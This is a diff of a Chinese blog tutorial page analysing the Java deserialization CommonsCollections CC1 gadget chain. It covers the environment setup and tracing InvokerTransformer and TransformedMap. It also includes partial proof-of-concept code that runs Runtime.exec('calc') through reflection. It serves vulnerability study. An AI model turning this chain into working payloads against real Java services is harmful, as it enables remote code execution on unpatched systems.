@@ -6,26 +6,52 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="HandheldFriendly" content="True">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
-    <meta name="description" content="Java 反序列化 CommonsCollections 篇01-CC1 链">
+    <meta name="description" content="这一篇分析 Java 反序列化 CommonsCollections 的 CC1 链。">
 <meta property="og:type" content="article">
 <meta property="og:title" content="JAVA反序列化04">
 <meta property="og:url" content="https://example.com/2023/01/12/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9604/index.html">
 <meta property="og:site_name" content="学习记录">
-<meta property="og:description" content="Java 反序列化 CommonsCollections 篇01-CC1 链">
+<meta property="og:description" content="这一篇分析 Java 反序列化 CommonsCollections 的 CC1 链。">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://example.com/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9604/image-20230113103415079.png">
-<meta property="og:image" content="https://example.com/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9604/image-20230113103810638.png">
-<meta property="og:image" content="https://example.com/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9604/image-20230113103610790.png">
-<meta property="og:image" content="https://example.com/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9604/image-20230113103700410.png">
-<meta property="og:image" content="https://example.com/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9604/image-20230113104721285.png">
-<meta property="og:image" content="https://example.com/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9604/image-20230113104700713.png">
-<meta property="og:image" content="https://example.com/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9604/image-20230113105628020.png">
+<meta property="og:image" content="https://example.com/images/JAVA反序列化04/image-20230113103415079.png">
+<meta property="og:image" content="https://example.com/images/JAVA反序列化04/image-20230113103810638.png">
+<meta property="og:image" content="https://example.com/images/JAVA反序列化04/image-20230113103610790.png">
+<meta property="og:image" content="https://example.com/images/JAVA反序列化04/image-20230113103700410.png">
+<meta property="og:image" content="https://example.com/images/JAVA反序列化04/image-20230113104721285.png">
+<meta property="og:image" content="https://example.com/images/JAVA反序列化04/image-20230113104700713.png">
+<meta property="og:image" content="https://example.com/images/JAVA反序列化04/AttackRoad.png">
+<meta property="og:image" content="https://example.com/images/JAVA反序列化04/image-20230114163028342.png">
+<meta property="og:image" content="https://example.com/images/JAVA反序列化04/image-20230114163041395.png">
+<meta property="og:image" content="https://example.com/images/JAVA反序列化04/image-20230114163748548.png">
+<meta property="og:image" content="https://example.com/images/JAVA反序列化04/image-20230114163858589.png">
+<meta property="og:image" content="https://example.com/images/JAVA反序列化04/image-20230114164208076.png">
+<meta property="og:image" content="https://example.com/images/JAVA反序列化04/image-20230114164455224.png">
+<meta property="og:image" content="https://example.com/images/JAVA反序列化04/image-20230114165818223.png">
+<meta property="og:image" content="https://example.com/images/JAVA反序列化04/image-20230114170157802.png">
+<meta property="og:image" content="https://example.com/images/JAVA反序列化04/image-20230114171925635.png">
+<meta property="og:image" content="https://example.com/images/JAVA反序列化04/image-20230114172103631.png">
+<meta property="og:image" content="https://example.com/images/JAVA反序列化04/image-20230114172226071.png">
+<meta property="og:image" content="https://example.com/images/JAVA反序列化04/image-20230114172337170.png">
+<meta property="og:image" content="https://example.com/images/JAVA反序列化04/FindCheckSetValue.png">
+<meta property="og:image" content="https://example.com/images/JAVA反序列化04/image-20230114175224373.png">
+<meta property="og:image" content="https://example.com/images/JAVA反序列化04/MapEntry.png">
+<meta property="og:image" content="https://example.com/images/JAVA反序列化04/image-20230115133546821.png">
+<meta property="og:image" content="https://example.com/images/JAVA反序列化04/image-20230115134918137.png">
+<meta property="og:image" content="https://example.com/images/JAVA反序列化04/image-20230115135637097.png">
+<meta property="og:image" content="https://example.com/images/JAVA反序列化04/image-20230114203811881.png">
+<meta property="og:image" content="https://example.com/images/JAVA反序列化04/image-20230115144620313.png">
+<meta property="og:image" content="https://example.com/images/JAVA反序列化04/image-20230115145356647.png">
+<meta property="og:image" content="https://example.com/images/JAVA反序列化04/image-20230115153904226.png">
+<meta property="og:image" content="https://example.com/images/JAVA反序列化04/image-20230115160022559.png">
+<meta property="og:image" content="https://example.com/images/JAVA反序列化04/image-20230115164300770.png">
+<meta property="og:image" content="https://example.com/images/JAVA反序列化04/image-20230115165133347.png">
+<meta property="og:image" content="https://example.com/images/JAVA反序列化04/image-20230115165023655.png">
 <meta property="article:published_time" content="2023-01-12T11:48:51.000Z">
-<meta property="article:modified_time" content="2023-01-13T05:16:03.461Z">
+<meta property="article:modified_time" content="2023-01-15T11:02:17.622Z">
 <meta property="article:author" content="MirRoR4s">
 <meta property="article:tag" content="JAVA反序列化">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://example.com/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9604/image-20230113103415079.png">
+<meta name="twitter:image" content="https://example.com/images/JAVA反序列化04/image-20230113103415079.png">
     
     
       
@@ -100,6 +126,8 @@
     <span id="actions">
       <ul>
         
+        <li><a class="icon" aria-label="上一篇" href="/2023/01/14/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/index.html"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
         
         <li><a class="icon" aria-label="下一篇" href="/2023/01/11/YApi-1-12-0-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/index.html"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
         
@@ -124,14 +152,13 @@
   <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://example.com/2023/01/12/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9604/index.html&title=JAVA反序列化04"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
   <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://example.com/2023/01/12/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9604/index.html&title=JAVA反序列化04"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
   <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://example.com/2023/01/12/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9604/index.html&name=JAVA反序列化04&description=&lt;!--toc--&gt;
-
-&lt;p&gt;Java 反序列化 CommonsCollections 篇01-CC1 链&lt;/p&gt;"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+&lt;p&gt;这一篇分析 Java 反序列化 CommonsCollections 的 CC1 链。&lt;/p&gt;"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
   <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://example.com/2023/01/12/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9604/index.html&t=JAVA反序列化04"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
 </ul>
 
     </div>
     <div id="toc">
-      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#qian-yan"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#huan-jing-da-jian"><span class="toc-number">2.</span> <span class="toc-text">环境搭建</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#pom-xml-tian-jia-yi-lai"><span class="toc-number">2.1.</span> <span class="toc-text">pom.xml 添加依赖</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#xiu-gai-sun-bao"><span class="toc-number">2.2.</span> <span class="toc-text">修改 sun 包</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#lou-dong-fu-xian"><span class="toc-number">3.</span> <span class="toc-text">漏洞复现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#can-kao-lian-jie"><span class="toc-number">4.</span> <span class="toc-text">参考链接</span></a></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#common-collections-xiang-guan-jie-shao"><span class="toc-number">1.</span> <span class="toc-text">Common-Collections 相关介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#qian-yan"><span class="toc-number">1.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#huan-jing-da-jian"><span class="toc-number">1.2.</span> <span class="toc-text">环境搭建</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#pom-xml-tian-jia-yi-lai"><span class="toc-number">1.2.1.</span> <span class="toc-text">pom.xml 添加依赖</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#xiu-gai-sun-bao"><span class="toc-number">1.2.2.</span> <span class="toc-text">修改 sun 包</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#transformmap-ban-cc1-gong-ji-lian-fen-xi"><span class="toc-number">2.</span> <span class="toc-text">TransformMap 版 CC1 攻击链分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#fan-xu-lie-hua-gong-ji-si-lu"><span class="toc-number">2.1.</span> <span class="toc-text">反序列化攻击思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-xun-zhao-wei-bu-de-exec-fang-fa"><span class="toc-number">2.2.</span> <span class="toc-text">1.寻找尾部的 exec 方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-chu-bu-xun-zhao-lian-zi"><span class="toc-number">2.3.</span> <span class="toc-text">2.初步寻找链子</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-wan-zheng-lian-zi"><span class="toc-number">2.4.</span> <span class="toc-text">3.完整链子</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-xun-zhao-readobject-lian-shou"><span class="toc-number">2.5.</span> <span class="toc-text">4.寻找 readObject() 链首</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ru-he-tong-guo-di-yi-ge-if"><span class="toc-number">2.5.0.1.</span> <span class="toc-text">如何通过第一个 if</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#can-kao-lian-jie"><span class="toc-number">2.6.</span> <span class="toc-text">参考链接</span></a></li></ol></li></ol>
     </div>
   </span>
 </div>
@@ -157,7 +184,7 @@
       
         <time datetime="2023-01-12T11:48:51.000Z" itemprop="datePublished">2023-01-12</time>
         
-        (Updated: <time datetime="2023-01-13T05:16:03.461Z" itemprop="dateModified">2023-01-13</time>)
+        (Updated: <time datetime="2023-01-15T11:02:17.622Z" itemprop="dateModified">2023-01-15</time>)
         
       
     </div>
@@ -183,10 +210,9 @@
 
   <div class="content" itemprop="articleBody">
     <!--toc-->
-
-<p>Java 反序列化 CommonsCollections 篇01-CC1 链</p>
+<p>这一篇分析 Java 反序列化 CommonsCollections 的 CC1 链。</p>
 <span id="more"></span>
-
+<h2 id="common-collections-xiang-guan-jie-shao"><a href="#Common-Collections-相关介绍" class="headerlink" title="Common-Collections 相关介绍"></a>Common-Collections 相关介绍<a href="#common-collections-xiang-guan-jie-shao" class="header-anchor">#</a></h2><p>直接看<a target="_blank" rel="noopener" href="https://blinkfox.github.io/2018/09/13/hou-duan/java/commons/commons-collections-bao-he-jian-jie/">闪烁之狐</a>大佬的即可。</p>
 <h3 id="qian-yan"><a href="#前言" class="headerlink" title="前言"></a>前言<a href="#qian-yan" class="header-anchor">#</a></h3><h3 id="huan-jing-da-jian"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建<a href="#huan-jing-da-jian" class="header-anchor">#</a></h3><ul>
 <li><a target="_blank" rel="noopener" href="https://www.oracle.com/cn/java/technologies/javase/javase8-archive-downloads.html">JDK8u65</a></li>
 <li><a target="_blank" rel="noopener" href="http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/af660750b2f4">openJDK 8u65</a></li>
@@ -194,31 +220,160 @@
 </ul>
 <p>首先 jdk 版本这里，要求的是 jdk8u65 的，如果我们用 jdk8u71 这种，CC 链的漏洞就被修掉了，用不了。</p>
 <p><a target="_blank" rel="noopener" href="https://www.oracle.com/cn/java/technologies/javase/javase8-archive-downloads.html">jdk8u65下载链接</a></p>
-<p>不知道为啥下的是 8u65，但是文件名显示的是 8u111 什么的</p>
+<blockquote>
+<p>不知道为啥下载的是 8u65，但是文件名显示的是 8u111 什么的</p>
+</blockquote>
 <h4 id="pom-xml-tian-jia-yi-lai"><a href="#pom-xml-添加依赖" class="headerlink" title="pom.xml 添加依赖"></a>pom.xml 添加依赖<a href="#pom-xml-tian-jia-yi-lai" class="header-anchor">#</a></h4><p>再接着，创建一个 IDEA 项目，选中 maven，并使用 jdk8u65。创建完毕之后在 pom.xml 中添加如下依赖</p>
-<p><img src="/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9604/image-20230113103415079.png" alt="image-20230113103415079"></p>
+<p><img src="/images/JAVA反序列化04/image-20230113103415079.png" alt="image-20230113103415079"></p>
 <p>添加依赖之后右上角如果出现 pom 的图标，点击一下就好了。</p>
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.example<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>CC1<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- https://mvnrepository.com/artifact/commons-collections/commons-collections --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>8<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>8<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">project.build.sourceEncoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">project.build.sourceEncoding</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
 <p>如何验证环境导入成功？我们 import CC 的包</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br></pre></td></tr></table></figure>
-
 <p>如果成功说明安装成功了。之后点进去 <code>InvokerTransformer</code> 包，然后如果右上角出现了 pom 的下载源，那就下载。</p>
 <h4 id="xiu-gai-sun-bao"><a href="#修改-sun-包" class="headerlink" title="修改 sun 包"></a>修改 sun 包<a href="#xiu-gai-sun-bao" class="header-anchor">#</a></h4><p>首先在我们的 jdk8u65 文件夹有一个 src.zip</p>
-<p><img src="/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9604/image-20230113103810638.png" alt="image-20230113103810638"></p>
+<p><img src="/images/JAVA反序列化04/image-20230113103810638.png" alt="image-20230113103810638"></p>
 <p>我们在这个目录新建一个文件夹 src，并将 src.zip 的内容解压到 src，之后去下面的链接下载 sun 包。</p>
 <p><a target="_blank" rel="noopener" href="http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/af660750b2f4">openJDK 8u65</a>————去到这个下载链接并点击 zip 下载</p>
-<p><img src="/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9604/image-20230113103610790.png" alt="image-20230113103610790"></p>
+<p><img src="/images/JAVA反序列化04/image-20230113103610790.png" alt="image-20230113103610790"></p>
 <p>下载完毕之后解压，进入 <code>jdk-af660750b2f4/src/share/classes</code> 目录下，将 sun 文件夹复制到前面建立的 src 文件夹中</p>
-<p><img src="/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9604/image-20230113103700410.png" alt="image-20230113103700410"></p>
+<p><img src="/images/JAVA反序列化04/image-20230113103700410.png" alt="image-20230113103700410"></p>
 <p>之后进入 idea，打开项目结构，将我们的 sun 目录添加到源路径</p>
-<p><img src="/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9604/image-20230113104721285.png" alt="image-20230113104721285"></p>
-<p><img src="/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9604/image-20230113104700713.png" alt="image-20230113104700713"></p>
-<h3 id="lou-dong-fu-xian"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现<a href="#lou-dong-fu-xian" class="header-anchor">#</a></h3><p>接下来就正式开始复现 CC1 的链。</p>
+<p><img src="/images/JAVA反序列化04/image-20230113104721285.png" alt="image-20230113104721285"></p>
+<p><img src="/images/JAVA反序列化04/image-20230113104700713.png" alt="image-20230113104700713"></p>
+<h2 id="transformmap-ban-cc1-gong-ji-lian-fen-xi"><a href="#TransformMap-版-CC1-攻击链分析" class="headerlink" title="TransformMap 版 CC1 攻击链分析"></a>TransformMap 版 CC1 攻击链分析<a href="#transformmap-ban-cc1-gong-ji-lian-fen-xi" class="header-anchor">#</a></h2><h3 id="fan-xu-lie-hua-gong-ji-si-lu"><a href="#反序列化攻击思路" class="headerlink" title="反序列化攻击思路"></a>反序列化攻击思路<a href="#fan-xu-lie-hua-gong-ji-si-lu" class="header-anchor">#</a></h3><p>首先我们再次明确一下反序列化的攻击思路</p>
+<ul>
+<li>入口类需要一个 <code>readObject</code> 方法</li>
+<li>结尾需要一个能够命令执行的方法</li>
+<li>从入口类出发通过链子引导到结尾命令执行，故我们的攻击应从尾部出发去寻找头部。</li>
+</ul>
+<p><img src="/images/JAVA反序列化04/AttackRoad.png" alt="img"></p>
+<h3 id="1-xun-zhao-wei-bu-de-exec-fang-fa"><a href="#1-寻找尾部的-exec-方法" class="headerlink" title="1.寻找尾部的 exec 方法"></a>1.寻找尾部的 exec 方法<a href="#1-xun-zhao-wei-bu-de-exec-fang-fa" class="header-anchor">#</a></h3><p>接下来就正式开始复现 CC1 的链。</p>
 <p>首先在 idea 左侧项目找到 commons-collections-3.2.1，然后在集合模块找到 <code>Transformer.java</code> 文件。</p>
-<p><img src="/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9604/image-20230113105628020.png" alt="image-20230113105628020"></p>
-<h3 id="can-kao-lian-jie"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接<a href="#can-kao-lian-jie" class="header-anchor">#</a></h3><p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1no4y1U7E1/?spm_id_from=333.1007.top_right_bar_window_default_collection.content.click&vd_source=ed636173e6c328be468a244d33ee03e1">白日梦组长大佬</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/h0cksr/p/16189755.html">java反序列化(三)CommonsCollections篇 – CC1</a></p>
+<p><img src="/images/JAVA反序列化04/image-20230114163028342.png" alt="image-20230114163028342"></p>
+<p>具体是在 org.apache.commons.collections 包下</p>
+<p><img src="/images/JAVA反序列化04/image-20230114163041395.png" alt="image-20230114163041395"></p>
+<p>&gt;<br>&gt;</p>
+<blockquote>
+<p>网上没有人说为什么直接去 Transformer.java ，我也没懂，暂时搁置。</p>
+</blockquote>
+<p><img src="/images/JAVA反序列化04/image-20230114163748548.png" alt="image-20230114163748548"></p>
+<p>这是一个接口，我们使用 <code>ctrl + alt + B</code> 查看实现了这个接口的类。</p>
+<p><img src="/images/JAVA反序列化04/image-20230114163858589.png" alt="image-20230114163858589"></p>
+<p>我看的视频和文章都是人工翻找以上的类看看有没有能执行 exec 方法的，我就省略这一步了，直接定位到 <code>InvokerTransformer</code> </p>
+<ul>
+<li><code>InvokerTransformer</code> 类的 <code>transform</code> 方法 存在一个反射调用任意类，所以这可以作为我们链子的终点。</li>
+</ul>
+<p><img src="/images/JAVA反序列化04/image-20230114164208076.png" alt="image-20230114164208076"></p>
+<p>既然这里有漏洞，我们不妨先利用反射弹一个计算器玩玩。<code>InvokerTransformer</code> 类的构造函数如下</p>
+<p><img src="/images/JAVA反序列化04/image-20230114164455224.png" alt="image-20230114164455224"></p>
+<p>注意到构造函数是公有的，所以我们可以直接 new 出来。</p>
+<p>第一个参数明显是字符串类型的方法名，第二个参数是一个 Class 数组，表示方法的参数类型，第三个是一个 Object 数组，表示方法的参数。</p>
+<p>实例化一个 InvokerTransformer 对象</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br></pre></td></tr></table></figure>
+<p>用 Runtime 类的实例对象作为参数调用上述对象的 transfrom 方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">invokerTransformer.transform(runtime);</span><br></pre></td></tr></table></figure>
+<p>运行之后就可以弹出计算器，具体为什么可以弹计算器就不写了，可以自行分析一下。</p>
+<p>注意到我们最后一句代码是 <code>invokerTransformer.transform(runtime)</code> ，所以我们下一步的目标就是去找调用 <code>transform</code> 方法的不同名函数</p>
+<h3 id="2-chu-bu-xun-zhao-lian-zi"><a href="#2-初步寻找链子" class="headerlink" title="2.初步寻找链子"></a>2.初步寻找链子<a href="#2-chu-bu-xun-zhao-lian-zi" class="header-anchor">#</a></h3><p>如上所述，现在回到 <code>transform</code> 方法并寻找调用了这个方法的不同名的函数。IDEA 可以帮我们快速做到这一点，只需要将光标停留在这个方法上并右键点击 find usages 即可。如果 find usages 有问题的话，可以先 <code>Ctrl+Alt+Shift+F7</code>，选择 <code>All place</code> 查询。最后的结果应如下图</p>
+<p><img src="/images/JAVA反序列化04/image-20230114165818223.png" alt="image-20230114165818223"></p>
+<blockquote>
+<p>这里同样有一个逐个翻看调用了 transform 方法的那些类的操作，目的是为了找到可行的链子。我节省时间故直接给出答案。</p>
+</blockquote>
+<p> <code>TransformedMap</code> 类调用了 <code>transform</code> 方法</p>
+<p><img src="/images/JAVA反序列化04/image-20230114170157802.png" alt="image-20230114170157802"></p>
+<p>具体地说是这个类中的 <code>checkSetValue()</code> 方法调用了 <code>transform()</code> 方法。我们右键选中然后 jump to source</p>
+<p><img src="/images/JAVA反序列化04/image-20230114171925635.png" alt="image-20230114171925635"></p>
+<ul>
+<li>OK，接下来我们去看一看 <code>valueTransformer.checkSetValue</code> 的 <code>valueTransformer</code> 是什么东西，最终在 <code>TransformedMap</code> 的构造函数中发现了 <code>valueTransformer</code></li>
+</ul>
+<p><img src="/images/JAVA反序列化04/image-20230114172103631.png" alt="image-20230114172103631"></p>
+<p><img src="/images/JAVA反序列化04/image-20230114172226071.png" alt="image-20230114172226071"></p>
+<ul>
+<li>因为 <code>TransformedMap</code> 的构造方法作用域是 <code>protected</code>，我们还需要去找一找谁调用了 <code>TransformedMap</code> 的构造方法。</li>
+</ul>
+<p>发现在 <code>decorate()</code> 静态方法中创建了 <code>TransformedMap</code> 对象</p>
+<p><img src="/images/JAVA反序列化04/image-20230114172337170.png" alt="image-20230114172337170"></p>
+<p>到这一步，尝试将其作为链子的开头，编写 POC</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 实例化一个 InvokerTransformer 对象</span></span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line"><span class="comment">//</span></span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line"></span><br><span class="line">        HashMap&lt;String,String&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// decorate 方法的返回类型是 Map</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">transformedMap</span> <span class="operator">=</span>  TransformedMap.decorate(hashMap,<span class="literal">null</span>,invokerTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// checkSetValue 方法是 protected，所以接下来要通过反射调用这个方法</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> TransformedMap.class;</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> c.getDeclaredMethod(<span class="string">&quot;checkSetValue&quot;</span>,Object.class);</span><br><span class="line">        method.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        method.invoke(transformedMap,runtime);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>再顺带讲一讲这个链子是怎么构造出来的吧，这里讲一遍，之后的就不讲了。</p>
+<ul>
+<li>先明确一下思路，尾部链子，也就是我们要利用的漏洞，是因为 <code>invokeTransformer</code> 的 <code>transform</code> 方法可以进行反射的命令执行。</li>
+<li>在执行 <code>.decorate</code> 方法的时候，会新建 <code>TransformedMap</code> 对象，我们调用对象的 <code>checkSetValue</code> 方法（因为我们无法直接获取 <code>TransformedMap</code> 对象，它的作用域是 <code>protected</code>）。</li>
+<li>在 <code>checkSetValue</code> 方法当中，会执行 <code>.transform</code> 的方法。这也就是我们链子的尾部 ———— <code>.transform</code></li>
+</ul>
